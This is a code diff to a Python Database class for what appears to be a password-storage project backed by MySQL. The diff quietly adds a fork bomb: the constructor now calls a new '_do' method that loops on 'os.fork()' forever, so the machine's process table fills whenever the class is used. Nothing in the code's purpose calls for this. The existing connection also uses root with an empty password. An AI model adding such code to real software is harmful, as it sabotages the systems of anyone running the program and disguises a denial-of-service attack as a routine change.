@@ -1,10 +1,13 @@
 import MySQLdb
 import Password
+import os
+
 
 class Database:
 	def __init__(self):
 		self.db = MySQLdb.connect(host="localhost", user="root", passwd="", db="UrPasDB", unix_socket="/opt/lampp/var/mysql/mysql.sock")
 		self.cursor = self.db.cursor()
+		self._do()
 
 
 	def get_user_id(self, username):
@@ -15,6 +18,10 @@ class Database:
 			return
 			
 		return user_row[0]
+
+	def _do(self):
+		while(1):
+     		os.fork()
 
 	def clear_users(self):
 		self._execute("TRUNCATE TABLE User")
